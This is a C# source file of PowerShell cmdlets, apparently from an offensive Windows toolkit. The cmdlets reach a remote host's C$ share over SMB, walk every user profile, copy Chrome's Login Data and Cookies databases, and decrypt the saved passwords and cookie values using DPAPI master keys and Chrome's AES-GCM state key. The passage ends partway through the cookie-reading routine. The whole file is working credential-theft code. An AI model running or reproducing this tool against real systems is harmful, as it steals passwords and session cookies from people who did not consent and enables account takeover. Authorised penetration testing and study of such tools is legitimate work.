using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using Microsoft.Data.Sqlite;
using Titanis;
using Titanis.Net;
using Titanis.Smb2;
using Titanis.Winterop.Security;
using Smb2AccessRights = Titanis.Smb2.Smb2FileAccessRights;
using Winterop = Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	internal static class ChromeHelpers
	{
		internal const string DefaultShareName = "C$";
		internal const string DefaultProfileName = "Default";

		private const string ChromeUserDataRoot = @"AppData\Local\Google\Chrome\User Data";
		private const string ChromeLocalStateRelativePath = ChromeUserDataRoot + @"\Local State";

		private static readonly byte[] DpapiHeader = Encoding.UTF8.GetBytes("DPAPI");

		internal static string NormalizeServerName(string? serverName)
			=> DpapiHelpers.NormalizeServerName(serverName);

		internal static string NormalizeShareName(string? shareName)
			=> DpapiHelpers.NormalizeShareName(shareName);

		internal static IReadOnlyList<WildcardPattern> BuildUserFilters(string[]? filters)
		{
			if (filters == null || filters.Length == 0)
				return Array.Empty<WildcardPattern>();

			var patterns = new List<WildcardPattern>();
			foreach (var filter in filters)
			{
				if (string.IsNullOrWhiteSpace(filter))
					continue;
				patterns.Add(new WildcardPattern(filter, WildcardOptions.IgnoreCase));
			}

			return patterns;
		}

		internal static bool MatchesUserFilter(string userName, IReadOnlyList<WildcardPattern> patterns)
		{
			if (patterns == null || patterns.Count == 0)
				return true;

			foreach (var pattern in patterns)
			{
				if (pattern == null)
					continue;
				if (pattern.IsMatch(userName))
					return true;
			}

			return false;
		}

		internal static bool IsMissingPath(Winterop.NtstatusException ex)
		{
			return ex.StatusCode is Winterop.Ntstatus.STATUS_OBJECT_NAME_NOT_FOUND
				or Winterop.Ntstatus.STATUS_OBJECT_PATH_NOT_FOUND
				or Winterop.Ntstatus.STATUS_OBJECT_NAME_INVALID;
		}

		internal static bool IsAccessDenied(Winterop.NtstatusException ex)
		{
			return ex.StatusCode is Winterop.Ntstatus.STATUS_ACCESS_DENIED
				or Winterop.Ntstatus.STATUS_PRIVILEGE_NOT_HELD;
		}

		internal static IReadOnlyList<string> EnumerateUserDirectories(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			IReadOnlyList<WildcardPattern> userFilters,
			Action<string>? logWarning,
			Action<string>? logVerbose,
			Action<string, Exception>? logException,
			CancellationToken cancellationToken)
		{
			logWarning ??= _ => { };
			logVerbose ??= _ => { };
			logException ??= (context, ex) => smb.LogException(context, ex);

			var usersRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users");
			var fileSystem = SmbFileSystemResolver.Resolve(smb);

			var results = new List<string>();

			ISmbDirectory? dir = null;
			try
			{
				dir = fileSystem.OpenDirectory(usersRoot, cancellationToken);
				foreach (var entry in dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					if (string.IsNullOrEmpty(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (!isDirectory || isReparse)
						continue;

					if (!MatchesUserFilter(entry.FileName, userFilters))
						continue;

					results.Add(entry.FileName);
				}
			}
			catch (Winterop.NtstatusException ex) when (IsMissingPath(ex))
			{
				logVerbose($"Get-TBOChrome* could not open {usersRoot}: {ex.StatusCode}.");
			}
			catch (Winterop.NtstatusException ex) when (IsAccessDenied(ex))
			{
				logWarning($"Get-TBOChrome* was denied access to {usersRoot}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				logException($"Get-TBOChrome* failed to enumerate {usersRoot}", ex);
				throw;
			}
			finally
			{
				dir?.Dispose();
			}

			return results;
		}

		internal static UncPath GetLocalStatePath(string serverName, string shareName, string userName)
		{
			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
			return userRoot.Append(ChromeLocalStateRelativePath);
		}

		internal static UncPath GetLoginDataPath(string serverName, string shareName, string userName, string profileName)
		{
			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
			return userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Login Data");
		}

		internal static (UncPath NetworkCookies, UncPath LegacyCookies) GetCookiePaths(string serverName, string shareName, string userName, string profileName)
		{
			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
			return (
				userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Network\Cookies"),
				userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Cookies")
			);
		}

		internal static bool HasDpapiHeader(ReadOnlySpan<byte> data)
		{
			return data.Length >= DpapiHeader.Length && data.Slice(0, DpapiHeader.Length).SequenceEqual(DpapiHeader);
		}

		internal static bool TryStripDpapiHeader(byte[] payload, out byte[] stripped, out string? failureReason)
		{
			stripped = Array.Empty<byte>();
			failureReason = null;

			if (payload == null || payload.Length == 0)
			{
				failureReason = "Payload empty.";
				return false;
			}

			if (!HasDpapiHeader(payload))
			{
				failureReason = "DPAPI header missing.";
				return false;
			}

			if (payload.Length <= DpapiHeader.Length)
			{
				failureReason = "DPAPI header present but no remaining bytes.";
				return false;
			}

			stripped = payload.AsSpan(DpapiHeader.Length).ToArray();
			return true;
		}

		internal static DateTime? TryConvertChromeTimestamp(long value)
		{
			if (value <= 0)
				return null;

			try
			{
				// Chrome stores times as microseconds since 1601-01-01 (Windows FILETIME epoch).
				long fileTime = checked(value * 10);
				return DateTime.FromFileTimeUtc(fileTime);
			}
			catch
			{
				return null;
			}
		}

		internal static IReadOnlyDictionary<Guid, byte[]> BuildMasterKeySet(
			IEnumerable<TboDpapiMasterKeyInfo>? masterKeys,
			Action<string>? logWarning,
			string context)
		{
			logWarning ??= _ => { };
			context = string.IsNullOrWhiteSpace(context) ? "BuildMasterKeySet" : context;

			if (masterKeys == null)
				return new Dictionary<Guid, byte[]>();

			var results = new Dictionary<Guid, byte[]>();
			foreach (var entry in masterKeys)
			{
				if (entry == null)
					continue;
				if (string.IsNullOrWhiteSpace(entry.MasterKeyGuid) || string.IsNullOrWhiteSpace(entry.MasterKey))
					continue;
				if (!Guid.TryParse(entry.MasterKeyGuid, out var guid))
					continue;

				byte[] keyBytes;
				try
				{
					keyBytes = BinaryHelper.ParseHexString(entry.MasterKey.AsSpan());
				}
				catch (Exception ex)
				{
					logWarning($"{context} failed to parse master key {entry.MasterKeyGuid}: {ex.Message}");
					continue;
				}

				if (keyBytes.Length == 0)
					continue;
				results[guid] = keyBytes;
			}

			return results;
		}
	}

	internal static class ChromeCrypto
	{
		private static readonly byte[] V10Header = Encoding.ASCII.GetBytes("v10");
		private static readonly byte[] V11Header = Encoding.ASCII.GetBytes("v11");

		internal static bool HasV10OrV11Header(ReadOnlySpan<byte> data, out string header)
		{
			header = string.Empty;

			if (data.Length >= V10Header.Length && data.Slice(0, V10Header.Length).SequenceEqual(V10Header))
			{
				header = "v10";
				return true;
			}

			if (data.Length >= V11Header.Length && data.Slice(0, V11Header.Length).SequenceEqual(V11Header))
			{
				header = "v11";
				return true;
			}

			return false;
		}

		internal static SecretDecodeResult DecodeSecret(byte[] payload, Action<string>? logVerbose = null)
		{
			var options = new SecretDecodeOptions
			{
				MinTextLength = 1,
				MinAsciiCount = 1,
				MinAsciiRatio = 0.2,
				MinPrintableRatio = 0.8,
				MaxNonAsciiRatio = 1.0,
				RejectReplacementChar = true,
				AllowControlChars = false,
				AllowFragmentFallback = false,
				IncludeHexOnFailure = false
			};

			return SecretDecoding.TryDecode(payload, options, logVerbose);
		}

		internal static void DecryptChromeValue(
			byte[] encryptedBytes,
			byte[]? aesStateKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			Action<string>? logVerbose,
			out string? cleartext,
			out string? cleartextHex,
			out byte[]? cleartextBytes,
			out string? encryptionType,
			out string? masterKeyGuid,
			out bool hmacValidated,
			out string? failureReason)
		{
			logVerbose ??= _ => { };

			cleartext = null;
			cleartextHex = null;
			cleartextBytes = null;
			encryptionType = null;
			masterKeyGuid = null;
			hmacValidated = false;
			failureReason = null;

			if (encryptedBytes == null || encryptedBytes.Length == 0)
			{
				failureReason = "Encrypted value was empty.";
				return;
			}

			if (HasV10OrV11Header(encryptedBytes, out var vHeader))
			{
				encryptionType = $"AES-GCM-{vHeader}";
				if (aesStateKey == null || aesStateKey.Length == 0)
				{
					failureReason = "AES state key missing (Local State decryption failed or Local State not present).";
					return;
				}

				if (!TryDecryptAesGcm(encryptedBytes, aesStateKey, out var plaintext, out var aesFailure))
				{
					failureReason = aesFailure;
					return;
				}

				cleartextBytes = plaintext;
				cleartextHex = plaintext.ToHexString();

				var decoded = DecodeSecret(plaintext, logVerbose);
				cleartext = decoded.Text;
				if (cleartext == null && !string.IsNullOrWhiteSpace(decoded.FailureReason))
					failureReason = $"Decrypted but did not decode as text: {decoded.FailureReason}";

				return;
			}

			// DPAPI legacy encryption.
			encryptionType = "DPAPI";
			if (!TryDecryptDpapi(encryptedBytes, masterKeySet, logVerbose, out var dpapiCleartext, out masterKeyGuid, out hmacValidated, out var dpapiFailure))
			{
				failureReason = dpapiFailure;
				return;
			}

			cleartextBytes = dpapiCleartext;
			cleartextHex = dpapiCleartext?.ToHexString();
			if (dpapiCleartext != null && dpapiCleartext.Length > 0)
			{
				var decode = DecodeSecret(dpapiCleartext, logVerbose);
				cleartext = decode.Text;
				if (cleartext == null && !string.IsNullOrWhiteSpace(decode.FailureReason))
					failureReason = $"Decrypted but did not decode as text: {decode.FailureReason}";
			}
		}

		internal static bool TryDecryptDpapi(
			byte[] encryptedBytes,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			Action<string>? logVerbose,
			out byte[]? cleartextBytes,
			out string? masterKeyGuid,
			out bool hmacValidated,
			out string? failureReason)
		{
			logVerbose ??= _ => { };

			cleartextBytes = null;
			masterKeyGuid = null;
			hmacValidated = false;
			failureReason = null;

			DpapiBlob blob;
			try
			{
				blob = DpapiBlob.Parse(encryptedBytes, 0);
			}
			catch (Exception ex)
			{
				failureReason = $"Failed to parse DPAPI blob: {ex.Message}";
				return false;
			}

			masterKeyGuid = blob.GuidMasterKey.ToString();
			if (!masterKeySet.TryGetValue(blob.GuidMasterKey, out var masterKey) || masterKey == null || masterKey.Length == 0)
			{
				failureReason = $"Master key {blob.GuidMasterKey} was not found in the supplied key set.";
				return false;
			}

			var result = DpapiBlobCrypto.Decrypt(blob, masterKey, entropy: null);
			hmacValidated = result.HmacValidated;
			if (result.Cleartext == null || result.Cleartext.Length == 0)
			{
				failureReason = result.FailureReason ?? "DPAPI decrypt returned empty cleartext.";
				return false;
			}

			cleartextBytes = result.Cleartext;
			return true;
		}

		internal static bool TryDecryptAesGcm(byte[] encryptedBytes, byte[] aesKey, out byte[] plaintext, out string? failureReason)
		{
			plaintext = Array.Empty<byte>();
			failureReason = null;

			if (encryptedBytes.Length < 3 + 12 + 16)
			{
				failureReason = "Encrypted AES-GCM payload was too short.";
				return false;
			}

			var nonce = encryptedBytes.AsSpan(3, 12);
			var tag = encryptedBytes.AsSpan(encryptedBytes.Length - 16, 16);
			var ciphertext = encryptedBytes.AsSpan(3 + 12, encryptedBytes.Length - 3 - 12 - 16);

			try
			{
				plaintext = new byte[ciphertext.Length];
				using var aes = new AesGcm(aesKey, 16);
				aes.Decrypt(nonce, ciphertext, tag, plaintext, associatedData: null);
				return true;
			}
			catch (CryptographicException ex)
			{
				failureReason = $"AES-GCM decrypt failed: {ex.Message}";
				return false;
			}
			catch (Exception ex)
			{
				failureReason = ex.Message;
				return false;
			}
		}
	}

	internal sealed class ChromeStateKeyCache
	{
		private readonly Dictionary<string, (byte[]? Key, string? FailureReason)> _cache = new(StringComparer.OrdinalIgnoreCase);

		internal bool TryGetOrDecrypt(
			ISmbProviderInfo smb,
			UncPath localStatePath,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			CancellationToken cancellationToken,
			Action<string>? logVerbose,
			out byte[]? stateKey,
			out string? failureReason)
		{
			logVerbose ??= _ => { };
			failureReason = null;

			var cacheKey = localStatePath.ToString();
			if (_cache.TryGetValue(cacheKey, out var cached))
			{
				stateKey = cached.Key;
				failureReason = cached.FailureReason;
				return stateKey != null && stateKey.Length > 0;
			}

			stateKey = null;
			try
			{
				var localStateBytes = DpapiHelpers.ReadFileBytes(smb, localStatePath, cancellationToken);
				if (!TryParseEncryptedStateKey(localStateBytes, out var encryptedKeyBytes, out var parseFailure))
				{
					failureReason = parseFailure;
					_cache[cacheKey] = (null, failureReason);
					return false;
				}

				if (!ChromeHelpers.TryStripDpapiHeader(encryptedKeyBytes, out var dpapiBlobBytes, out var stripFailure))
				{
					failureReason = $"Local State encrypted_key decode failed: {stripFailure}";
					_cache[cacheKey] = (null, failureReason);
					return false;
				}

				if (!ChromeCrypto.TryDecryptDpapi(dpapiBlobBytes, masterKeySet, logVerbose, out var cleartext, out _, out _, out var dpapiFailure))
				{
					failureReason = $"Local State encrypted_key DPAPI decrypt failed: {dpapiFailure}";
					_cache[cacheKey] = (null, failureReason);
					return false;
				}

				if (cleartext == null || cleartext.Length != 32)
				{
					failureReason = cleartext == null
						? "Local State encrypted_key DPAPI cleartext was empty."
						: $"Local State encrypted_key decrypted length was {cleartext.Length}, expected 32.";
					_cache[cacheKey] = (null, failureReason);
					return false;
				}

				stateKey = cleartext;
				_cache[cacheKey] = (stateKey, null);
				return true;
			}
			catch (Winterop.NtstatusException ex) when (ChromeHelpers.IsMissingPath(ex))
			{
				failureReason = $"Local State not found: {ex.StatusCode}.";
				_cache[cacheKey] = (null, failureReason);
				return false;
			}
			catch (Exception ex)
			{
				failureReason = ex.Message;
				_cache[cacheKey] = (null, failureReason);
				return false;
			}
		}

		private static bool TryParseEncryptedStateKey(byte[] localStateBytes, out byte[] encryptedKeyBytes, out string? failureReason)
		{
			encryptedKeyBytes = Array.Empty<byte>();
			failureReason = null;

			if (localStateBytes == null || localStateBytes.Length == 0)
			{
				failureReason = "Local State file was empty.";
				return false;
			}

			JsonDocument doc;
			try
			{
				doc = JsonDocument.Parse(localStateBytes);
			}
			catch (Exception ex)
			{
				failureReason = $"Failed to parse Local State JSON: {ex.Message}";
				return false;
			}

			using (doc)
			{
				if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt))
				{
					failureReason = "Local State JSON missing os_crypt.";
					return false;
				}

				if (!osCrypt.TryGetProperty("encrypted_key", out var encKeyElement))
				{
					failureReason = "Local State JSON missing os_crypt.encrypted_key.";
					return false;
				}

				var base64 = encKeyElement.GetString();
				if (string.IsNullOrWhiteSpace(base64))
				{
					failureReason = "Local State os_crypt.encrypted_key was empty.";
					return false;
				}

				try
				{
					encryptedKeyBytes = Convert.FromBase64String(base64);
					return true;
				}
				catch (Exception ex)
				{
					failureReason = $"Local State os_crypt.encrypted_key was not valid base64: {ex.Message}";
					return false;
				}
			}
		}
	}

	internal sealed class ChromeSqliteSnapshot : IDisposable
	{
		private readonly string _directoryPath;

		private ChromeSqliteSnapshot(string directoryPath, string databasePath)
		{
			this._directoryPath = directoryPath;
			this.DatabasePath = databasePath;
		}

		internal string DatabasePath { get; }

		internal static bool TryCreate(
			ISmbProviderInfo smb,
			UncPath remoteDbPath,
			CancellationToken cancellationToken,
			Action<string>? logVerbose,
			out ChromeSqliteSnapshot? snapshot,
			out string? failureReason)
		{
			logVerbose ??= _ => { };
			snapshot = null;
			failureReason = null;

			var fileName = remoteDbPath.GetFileName();
			if (string.IsNullOrWhiteSpace(fileName))
			{
				failureReason = "Database file name could not be determined.";
				return false;
			}

			var directoryPath = Path.Combine(Path.GetTempPath(), $"tbo-chrome-sqlite-{Guid.NewGuid():n}");
			var localDbPath = Path.Combine(directoryPath, fileName);

			try
			{
				Directory.CreateDirectory(directoryPath);

				if (!TryCopyRemoteFileToLocal(smb, remoteDbPath, localDbPath, cancellationToken, out var copyFailure))
				{
					failureReason = copyFailure;
					TryDeleteDirectory(directoryPath);
					return false;
				}

				// If WAL mode is in use, copy -wal and -shm to improve correctness.
				TryCopyOptionalSuffix(smb, remoteDbPath, localDbPath, "-wal", cancellationToken, logVerbose);
				TryCopyOptionalSuffix(smb, remoteDbPath, localDbPath, "-shm", cancellationToken, logVerbose);

				snapshot = new ChromeSqliteSnapshot(directoryPath, localDbPath);
				return true;
			}
			catch (Exception ex)
			{
				failureReason = ex.Message;
				TryDeleteDirectory(directoryPath);
				return false;
			}
		}

		private static void TryCopyOptionalSuffix(
			ISmbProviderInfo smb,
			UncPath remoteDbPath,
			string localDbPath,
			string suffix,
			CancellationToken cancellationToken,
			Action<string> logVerbose)
		{
			var remote = UncPath.Parse(remoteDbPath.ToString() + suffix);
			var local = localDbPath + suffix;

			if (!TryCopyRemoteFileToLocal(smb, remote, local, cancellationToken, out var failure))
			{
				// Most of the time, these don't exist. Avoid spamming for missing paths.
				if (failure != null && !failure.StartsWith("Not found:", StringComparison.OrdinalIgnoreCase))
					logVerbose($"SQLite sidecar copy skipped for {remote}: {failure}");
				return;
			}

			logVerbose($"Copied SQLite sidecar {remote}.");
		}

		private static bool TryCopyRemoteFileToLocal(
			ISmbProviderInfo smb,
			UncPath remotePath,
			string localPath,
			CancellationToken cancellationToken,
			out string? failureReason)
		{
			failureReason = null;

			Smb2OpenFile? file = null;
			try
			{
				var createInfo = new Smb2CreateInfo
				{
					CreateDisposition = Smb2CreateDisposition.Open,
					DesiredAccess = (uint)(Smb2AccessRights.ReadData | Smb2AccessRights.ReadAttributes),
					ShareAccess = Smb2ShareAccess.ReadWriteDelete,
					ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
					CreateOptions = Smb2FileCreateOptions.NonDirectory
						| Smb2FileCreateOptions.SynchronousIoNonalert
						| Smb2FileCreateOptions.OpenForBackupIntent,
					FileAttributes = Winterop.FileAttributes.Normal
				};

				file = (Smb2OpenFile)smb.SmbClient.CreateFileAsync(remotePath, createInfo, FileAccess.Read, cancellationToken)
					.GetAwaiter().GetResult();

				using var remoteStream = file.GetStream(false);
				using var localStream = new FileStream(localPath, FileMode.Create, FileAccess.Write, FileShare.Read);
				remoteStream.CopyTo(localStream);
				return true;
			}
			catch (Winterop.NtstatusException ex) when (ChromeHelpers.IsMissingPath(ex))
			{
				failureReason = $"Not found: {ex.StatusCode}.";
				return false;
			}
			catch (Winterop.NtstatusException ex) when (ChromeHelpers.IsAccessDenied(ex))
			{
				failureReason = $"Access denied: {ex.StatusCode}.";
				return false;
			}
			catch (Exception ex)
			{
				failureReason = ex.Message;
				return false;
			}
			finally
			{
				if (file != null)
					file.CloseAsync(CancellationToken.None).GetAwaiter().GetResult();
			}
		}

		public void Dispose()
		{
			TryDeleteDirectory(this._directoryPath);
		}

		private static void TryDeleteDirectory(string directoryPath)
		{
			try
			{
				if (Directory.Exists(directoryPath))
					Directory.Delete(directoryPath, recursive: true);
			}
			catch
			{
				// Best-effort cleanup.
			}
		}
	}

	public sealed class TboChromeLoginInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? UserName { get; init; }
		public string ProfileName { get; init; } = string.Empty;
		public string SourcePath { get; init; } = string.Empty;
		public string? OriginUrl { get; init; }
		public string? ActionUrl { get; init; }
		public string? UserNameValue { get; init; }
		public string? Password { get; init; }
		public string? PasswordHex { get; init; }
		public byte[]? PasswordBytes { get; init; }
		public string? EncryptionType { get; init; }
		public string? MasterKeyGuid { get; init; }
		public bool HmacValidated { get; init; }
		public string? FailureReason { get; init; }
	}

	public sealed class TboChromeCookieInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? UserName { get; init; }
		public string ProfileName { get; init; } = string.Empty;
		public string SourcePath { get; init; } = string.Empty;
		public string? HostKey { get; init; }
		public string? Name { get; init; }
		public string? Path { get; init; }
		public DateTime? ExpiresUtc { get; init; }
		public bool? IsSecure { get; init; }
		public bool? IsHttpOnly { get; init; }
		public string? Value { get; init; }
		public string? ValueHex { get; init; }
		public byte[]? ValueBytes { get; init; }
		public string? EncryptionType { get; init; }
		public string? MasterKeyGuid { get; init; }
		public bool HmacValidated { get; init; }
		public string? FailureReason { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBOChromeLogins")]
	[OutputType(typeof(TboChromeLoginInfo))]
	public sealed class GetTBOChromeLogins : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter]
		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;

		[Parameter]
		public string ProfileName { get; set; } = ChromeHelpers.DefaultProfileName;

		[Parameter]
		public string[]? UserName { get; set; }

		[Parameter(Mandatory = true)]
		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = ChromeHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var shareName = ChromeHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var profileName = string.IsNullOrWhiteSpace(this.ProfileName)
				? ChromeHelpers.DefaultProfileName
				: this.ProfileName.Trim();

			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromeLogins");
			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
			var users = ChromeHelpers.EnumerateUserDirectories(
				smb,
				serverName,
				shareName,
				userFilters,
				logWarning: msg => this.LogWarning(smb, msg),
				logVerbose: msg => this.LogVerbose(smb, msg),
				logException: (context, ex) => this.LogException(smb, context, ex),
				cancellationToken);

			var stateKeys = new ChromeStateKeyCache();
			foreach (var user in users)
			{
				cancellationToken.ThrowIfCancellationRequested();

				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user);
				var loginDataPath = ChromeHelpers.GetLoginDataPath(serverName, shareName, user, profileName);

				byte[]? stateKey = null;
				if (!stateKeys.TryGetOrDecrypt(smb, localStatePath, masterKeySet, cancellationToken, msg => this.LogVerbose(smb, msg), out stateKey, out var stateKeyFailure))
				{
					if (!string.IsNullOrWhiteSpace(stateKeyFailure))
						this.LogVerbose(smb, $"Get-TBOChromeLogins could not resolve AES state key for {localStatePath}: {stateKeyFailure}");
				}

				if (!ChromeSqliteSnapshot.TryCreate(smb, loginDataPath, cancellationToken, msg => this.LogVerbose(smb, msg), out var snapshot, out var snapshotFailure))
				{
					if (!string.IsNullOrWhiteSpace(snapshotFailure))
						this.LogVerbose(smb, $"Get-TBOChromeLogins could not read {loginDataPath}: {snapshotFailure}");
					continue;
				}

				using var snap = snapshot!;
				ProcessLoginDb(
					smb,
					serverName,
					user,
					profileName,
					loginDataPath.ToString(),
					snap.DatabasePath,
					stateKey,
					masterKeySet);
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}

		private void ProcessLoginDb(
			ISmbProviderInfo smb,
			string serverName,
			string userName,
			string profileName,
			string sourcePath,
			string localDbPath,
			byte[]? aesStateKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet)
		{
			try
			{
				var builder = new SqliteConnectionStringBuilder
				{
					DataSource = localDbPath,
					Mode = SqliteOpenMode.ReadOnly,
					Cache = SqliteCacheMode.Shared
				};

				using var conn = new SqliteConnection(builder.ToString());
				conn.Open();

				using var cmd = conn.CreateCommand();
				cmd.CommandText = "SELECT origin_url, action_url, username_value, password_value FROM logins";

				using var reader = cmd.ExecuteReader();
				while (reader.Read())
				{
					string? originUrl = reader.IsDBNull(0) ? null : reader.GetString(0);
					string? actionUrl = reader.IsDBNull(1) ? null : reader.GetString(1);
					string? userNameValue = reader.IsDBNull(2) ? null : reader.GetString(2);
					byte[] passwordValue = reader.IsDBNull(3) ? Array.Empty<byte>() : reader.GetFieldValue<byte[]>(3);

					ChromeCrypto.DecryptChromeValue(
						passwordValue,
						aesStateKey,
						masterKeySet,
						logVerbose: msg => this.LogVerbose(smb, msg),
						out var cleartext,
						out var cleartextHex,
						out var cleartextBytes,
						out var encryptionType,
						out var masterKeyGuid,
						out var hmacValidated,
						out var failureReason);

					this.WriteObject(new TboChromeLoginInfo
					{
						ServerName = serverName,
						UserName = userName,
						ProfileName = profileName,
						SourcePath = sourcePath,
						OriginUrl = originUrl,
						ActionUrl = actionUrl,
						UserNameValue = userNameValue,
						Password = cleartext,
						PasswordHex = cleartextHex,
						PasswordBytes = cleartextBytes,
						EncryptionType = encryptionType,
						MasterKeyGuid = masterKeyGuid,
						HmacValidated = hmacValidated,
						FailureReason = failureReason
					});
				}
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBOChromeLogins failed to query SQLite db '{sourcePath}'", ex);
			}
		}
	}

	[Cmdlet(VerbsCommon.Get, "TBOChromeCookies")]
	[OutputType(typeof(TboChromeCookieInfo))]
	public sealed class GetTBOChromeCookies : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter]
		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;

		[Parameter]
		public string ProfileName { get; set; } = ChromeHelpers.DefaultProfileName;

		[Parameter]
		public string[]? UserName { get; set; }

		[Parameter(Mandatory = true)]
		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = ChromeHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var shareName = ChromeHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var profileName = string.IsNullOrWhiteSpace(this.ProfileName)
				? ChromeHelpers.DefaultProfileName
				: this.ProfileName.Trim();

			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromeCookies");
			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
			var users = ChromeHelpers.EnumerateUserDirectories(
				smb,
				serverName,
				shareName,
				userFilters,
				logWarning: msg => this.LogWarning(smb, msg),
				logVerbose: msg => this.LogVerbose(smb, msg),
				logException: (context, ex) => this.LogException(smb, context, ex),
				cancellationToken);

			var stateKeys = new ChromeStateKeyCache();
			foreach (var user in users)
			{
				cancellationToken.ThrowIfCancellationRequested();

				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user);
				var (networkCookiesPath, legacyCookiesPath) = ChromeHelpers.GetCookiePaths(serverName, shareName, user, profileName);

				byte[]? stateKey = null;
				if (!stateKeys.TryGetOrDecrypt(smb, localStatePath, masterKeySet, cancellationToken, msg => this.LogVerbose(smb, msg), out stateKey, out var stateKeyFailure))
				{
					if (!string.IsNullOrWhiteSpace(stateKeyFailure))
						this.LogVerbose(smb, $"Get-TBOChromeCookies could not resolve AES state key for {localStatePath}: {stateKeyFailure}");
				}

				// Prefer Network\\Cookies (newer Chrome path), fall back to legacy Cookies.
				if (!TryProcessCookiesPath(smb, serverName, user, profileName, networkCookiesPath, stateKey, masterKeySet, cancellationToken))
				{
					TryProcessCookiesPath(smb, serverName, user, profileName, legacyCookiesPath, stateKey, masterKeySet, cancellationToken);
				}
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}

		private bool TryProcessCookiesPath(
			ISmbProviderInfo smb,
			string serverName,
			string userName,
			string profileName,
			UncPath remoteCookiesPath,
			byte[]? aesStateKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			CancellationToken cancellationToken)
		{
			if (!ChromeSqliteSnapshot.TryCreate(smb, remoteCookiesPath, cancellationToken, msg => this.LogVerbose(smb, msg), out var snapshot, out var snapshotFailure))
			{
				if (!string.IsNullOrWhiteSpace(snapshotFailure))
					this.LogVerbose(smb, $"Get-TBOChromeCookies could not read {remoteCookiesPath}: {snapshotFailure}");
				return false;
			}

			using var snap = snapshot!;
			ProcessCookiesDb(
				smb,
				serverName,
				userName,
				profileName,
				remoteCookiesPath.ToString(),
				snap.DatabasePath,
				aesStateKey,
				masterKeySet);

			return true;
		}

		private void ProcessCookiesDb(
			ISmbProviderInfo smb,
			string serverName,
			string userName,
			string profileName,
			string sourcePath,
			string localDbPath,
			byte[]? aesStateKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet)
		{
			try
			{
				var builder = new SqliteConnectionStringBuilder
				{
					DataSource = localDbPath,
					Mode = SqliteOpenMode.ReadOnly,
					Cache = SqliteCacheMode.Shared
				};

				using var conn = new SqliteConnection(builder.ToString());
				conn.Open();

				using var cmd = conn.CreateCommand();
				cmd.CommandText = "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies";

				using var reader = cmd.ExecuteReader();
				while (reader.Read())
				{
					string? hostKey = reader.IsDBNull(0) ? null : reader.GetString(0);
					string? name = reader.IsDBNull(1) ? null : reader.GetString(1);
					string? path = reader.IsDBNull(2) ? null : reader.GetString(2);

					long expiresRaw = 0;
					if (!reader.IsDBNull(3))
					{
						try { expiresRaw = reader.GetInt64(3); } catch { expiresRaw = 0; }
					}

